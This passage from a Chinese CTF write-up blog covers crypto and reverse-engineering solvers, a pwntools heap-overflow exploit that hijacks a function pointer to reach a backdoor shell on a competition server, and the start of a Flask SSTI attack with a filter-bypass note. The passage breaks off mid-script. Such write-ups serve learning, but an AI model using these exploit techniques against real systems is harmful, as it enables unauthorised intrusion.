m = <span class="built_in">pow</span>(c2, d, n2)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>得到后一段flag：453b-b352-ab1385bd22af}</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091644221-341610445.png" alt="image-20241216091633317"></p><p>得到最终flag：</p><p><code>flag&#123;d50d53cd-e2ce-453b-b352-ab1385bd22af&#125;</code></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h2><p>题目提示使用了国产的交叉编译链对tbox的固件程序进行了编译，ida直接反编译的话会有一个异架构异常，网上搜一下，找到一篇<a href="https://www.iotsec-zone.com/article/379">参考文章</a>，然后直接用arm小端反编译，还是很难看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091736250-732638104.png" alt="image-20241216091725499"></p><p>但是基本的加密逻辑能大概看出来，有RC4有异或unk_8AA0</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091741237-1476403439.png" alt="image-20241216091730600"></p><p>没办法调，这块儿fuzz了好久，密文肯定是无脑存unk_8AA0的，key是”testkey”，肯定是用于RC4的key是没得跑的，但是不知道有没有用这个还有异或的逻辑，后面一步步fuzz的，先解RC4再解xor，先xor再RC4，然后试探xor的逻辑选取常见的那几种，要不就是对上面的key的模取异或，要不就是经典的前一个等于前一个异或后一个，然后逆回去，最后fuzz了很久（雾）。。。。</p><p>最终的逆向逻辑是先无魔改RC4，然后走一个前后异或（从最后一个异或回去即可）</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091747672-740300043.png" alt="image-20241216091736652"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">key=<span class="string">&quot;testkey&quot;</span></span><br><span class="line"></span><br><span class="line">data=[<span class="number">0x0a</span>,<span class="number">0x0d</span>,<span class="number">0x06</span>,<span class="number">0x1c</span>,<span class="number">0x1f</span>,<span class="number">0x54</span>,<span class="number">0x56</span>,<span class="number">0x53</span>,<span class="number">0x57</span>,<span class="number">0x51</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x1d</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x56</span>,<span class="number">0x03</span>,<span class="number">0x19</span>,<span class="number">0x1c</span>,<span class="number">0x00</span>,<span class="number">0x54</span>,<span class="number">0x03</span>,<span class="number">0x4b</span>,<span class="number">0x14</span>,<span class="number">0x58</span>,<span class="number">0x07</span>,<span class="number">0x02</span>,<span class="number">0x49</span>,<span class="number">0x4c</span>,<span class="number">0x02</span>,<span class="number">0x07</span>,<span class="number">0x01</span>,<span class="number">0x51</span>,<span class="number">0x0c</span>,<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x4f</span>,<span class="number">0x7d</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for k in range(len(data)):</span></span><br><span class="line"><span class="comment">#     data[k]=data[k]^key[k%7]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    data[i-<span class="number">1</span>]^=data[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(data[j]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;</code></p><h2 id="dump"><a href="#dump" class="headerlink" title="dump"></a>dump</h2><p>（最可惜的一题，拿到附件测了两下就知道可以黑盒fuzz了，不是00情况多种的话，我手爆感觉能有血，呜呜呜），先拉到ida大概看了一下，属于是又臭又长，但是看见有命令行里的传参</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091821240-2041104139.png" alt="image-20241216091810486"></p><p>就测了两下，对照密文</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091831890-1363112404.png" alt="image-20241216091821052"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091837256-2095190718.png" alt="image-20241216091826661"></p><p>脑神经寻思紧绷，直接测所有可见字符就好了，奈何测上道题给我榨干了，爆破脚本不太会搓了，直接手撕，给所有可见字符编一下码，接下来就是体力活儿了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091844450-1976891504.png" alt="image-20241216091833780"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00</span> <span class="number">0x1C</span> <span class="number">0x1D</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0x03</span> <span class="number">0x04</span> <span class="number">0x05</span> <span class="number">0x06</span> <span class="number">0x07</span> <span class="number">0x08</span> <span class="number">0x09</span> <span class="number">0x0A</span> <span class="number">0x0B</span> <span class="number">0x0C</span> <span class="number">0x0D</span> <span class="number">0x0E</span> <span class="number">0x0F</span> <span class="number">0x10</span> <span class="number">0x11</span> <span class="number">0x12</span> <span class="number">0x13</span> <span class="number">0x14</span> <span class="number">0x15</span> <span class="number">0x16</span> <span class="number">0x17</span> <span class="number">0x18</span> <span class="number">0x19</span> <span class="number">0x1A</span> <span class="number">0x1B</span> <span class="number">0x00</span> <span class="number">0x1E</span> <span class="number">0x1F</span> <span class="number">0x20</span> <span class="number">0x21</span> <span class="number">0x22</span> <span class="number">0x23</span> <span class="number">0x24</span> <span class="number">0x25</span> <span class="number">0x26</span> <span class="number">0x27</span> <span class="number">0x28</span> <span class="number">0x29</span> <span class="number">0x2A</span> <span class="number">0x2B</span> <span class="number">0x2C</span> <span class="number">0x2D</span> <span class="number">0x2E</span> <span class="number">0x2F</span> <span class="number">0x30</span> <span class="number">0x31</span> <span class="number">0x32</span> <span class="number">0x33</span> <span class="number">0x34</span> <span class="number">0x35</span> <span class="number">0x36</span> <span class="number">0x37</span> <span class="number">0x38</span> <span class="number">0x39</span> <span class="number">0x00</span></span><br><span class="line"></span><br><span class="line">flag&#123;MTczMDc?MzQ2Ng==&#125;</span><br><span class="line"><span class="comment">#上段中？部分不知道00的对应内容，最后在平台一个个试的最后结果是4（试出来之后不一会儿就给提示说是4了（乐））</span></span><br><span class="line">ABCDEFGHIJKL M NOPQRS T UVWXYZ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">02030405060708090a0b0c0d0e0f101112131415161718191a1b</span><br><span class="line">A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1e1f202122232425262728292a2b2c2d</span><br><span class="line">a b c d e f g h i j k l m n o p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1E <span class="number">24</span> <span class="number">38</span> 0E <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0E 05 <span class="number">20</span> <span class="number">00</span> 0E <span class="number">37</span> <span class="number">12</span> 1D 0F <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">23291e24380e1520370e0520000e3712 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> <span class="number">00</span> 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line"><span class="number">23</span> <span class="number">29</span> 1e <span class="number">24</span> <span class="number">38</span> 0e <span class="number">15</span> <span class="number">20</span> <span class="number">37</span> 0e 05 <span class="number">20</span> 1c 0e <span class="number">37</span> <span class="number">12</span> 1d 0f <span class="number">24</span> 01 01 <span class="number">39</span></span><br><span class="line"></span><br><span class="line">1c1d000000000000000000000100000002030405060708090a0b0c0d0e0f</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>flag&#123;MTczMDc4MzQ2Ng==&#125;</code></p><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="anote"><a href="#anote" class="headerlink" title="anote"></a>anote</h2><p>ida反编译不是给人看的，直接鸡爪启动，有add,show,edit三个功能，edit有堆溢出，可以读入40个字节，show会给出堆块的地址，并且有后门，edit可以输入负数，也就是说可以越界，并且有个call rax,根据偏移写入堆块地址，堆块中写入后门，getshell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091924480-1952953316.png" alt="image-20241216091913531"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091934966-125092182.png" alt="image-20241216091924255"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091939379-879390541.png" alt="image-20241216091928723"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;39.105.123.22&quot;</span>,<span class="number">30938</span>)</span><br><span class="line"></span><br><span class="line">backdoor=<span class="number">0x080489CE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">k,size,fenshu</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Choice&gt;&gt;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(k))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;len:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    io.sendline(fenshu)</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show()</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">heap_addr=<span class="built_in">int</span>(io.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x28</span>,p32(heap_addr-<span class="number">37000</span>)+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x21</span>)+p32(backdoor))</span><br><span class="line">edit(-<span class="number">8</span>,<span class="number">0x28</span>,p32(heap_addr+<span class="number">32</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202412/3051266-20241216091958877-230897655.png" alt="image-20241216091947749"></p><p><code>flag&#123;7c66ca9e-6fdb-4ea1-8c91-e759ae505e87&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pro-Labs-RastaLabs</title>
      <link href="/posts/71305da9.html"/>
      <url>/posts/71305da9.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="22b00f254d1a5eab0d51e3a7df36b03a5f2d9919783f7a50f4e865115ebe6e68"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory </tag>
            
            <tag> ProLabs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Pro-Labs-Zephyr</title>
      <link href="/posts/3130f160.html"/>
      <url>/posts/3130f160.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="7c83d21d2bd6d4ef87a17b101b471d7c5e1de0866459cd9eaa2f1404dbbd8c7f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-xray">      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">内容还没写完，需要密码才能查看！</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory </tag>
            
            <tag> ProLabs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鹏城杯 2024</title>
      <link href="/posts/da65110a.html"/>
      <url>/posts/da65110a.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="python口算"><a href="#python口算" class="headerlink" title="python口算"></a>python口算</h2><p>访问题目看要求是要一秒答题，果断找gpt写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span class="string">&quot;Are you ready for this?&quot;</span>:</span><br><span class="line">    time.sleep(<span class="number">1</span>)  <span class="comment"># 等待 1 秒</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次请求 /calc，模拟页面定时刷新后的情况</span></span><br><span class="line">    response = requests.get(calc_url, headers=headers)</span><br><span class="line">    h1_text = response.text.strip()  <span class="comment"># 获取返回内容</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查返回内容是否为算术表达式</span></span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[\d\+\-\*/\s]+$&quot;</span>, h1_text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;算术表达式为：&quot;</span>, h1_text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 使用 eval 计算结果</span></span><br><span class="line">            result = <span class="built_in">eval</span>(h1_text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算结果为：&quot;</span>, result)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">            answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">        </span><br><span class="line">            <span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">            response = requests.get(answer_url, headers=headers)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 提取返回中的 flag&#123;&#125; 内容</span></span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">r&#x27;flag\&#123;.*?\&#125;&#x27;</span>, response.text)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                flag = <span class="keyword">match</span>.group(<span class="number">0</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;获取到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;未找到 flag!&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;计算表达式时出错：&quot;</span>, e)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;返回内容不是算术表达式：&quot;</span>, h1_text)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;页面内容未发生变化，h1 内容为：&quot;</span>, h1_text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204414282-806340589.png" alt="img"></p><p>得到奖品</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">solved=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">global</span> current_expr</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前端计算</span></span><br><span class="line">    .....</span><br><span class="line">    .....</span><br><span class="line">    <span class="comment"># 通过计算</span></span><br><span class="line"></span><br><span class="line">    username = <span class="string">&#x27;ctfer!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;username&#x27;</span>):</span><br><span class="line">        username = request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> whitelist_filter(username,whitelist_patterns):</span><br><span class="line">            <span class="keyword">if</span> blacklist_filter(username):</span><br><span class="line">                <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;你过关！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;filtered&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, username=username, hint=<span class="string">&quot;f4dd790b-bc4e-48de-b717-903d433c597f&quot;</span>)</span><br></pre></td></tr></table></figure><p>发现这有个额外的参数username，就一直试get传参，怎么传都传不上去，多次测试后发现需要用get传data值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造带有计算结果和 username 参数的 URL</span></span><br><span class="line">answer_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?answer=<span class="subst">&#123;result&#125;</span>&amp;Submit=提交&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 提交答案并打印返回内容</span></span><br><span class="line">response = requests.get(answer_url, headers=headers,data=data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提交答案后的返回内容：&quot;</span>, response.text)</span><br></pre></td></tr></table></figure><p>修改上面这部分代码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202411/3051266-20241110204503328-1700217939.png" alt="img"></p><p>成功执行，后面就ssti直接打了，注意在黑名单有个空格过滤，需要绕一下最终payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> fenjing</span><br><span class="line"><span class="comment"># 主页面 URL</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.18.28/&quot;</span></span><br><span class="line">calc_url = url + <span class="string">&quot;calc&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起第一次请求，获取初始页面内容</span></span><br><span class="line">response = requests.get(url, headers=headers)</span><br><span class="line">soup = BeautifulSoup(response.text, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 h1 标签内容</span></span><br><span class="line">h1_text = soup.find(<span class="string">&#x27;h1&#x27;</span>).get_text().strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次请求内容:&quot;</span>, h1_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果 h1 标签内容为 &quot;Are you ready for this?&quot;，等待一秒后检查新的内容</span></span><br><span class="line"><span class="keyword">if</span> h1_text == <span 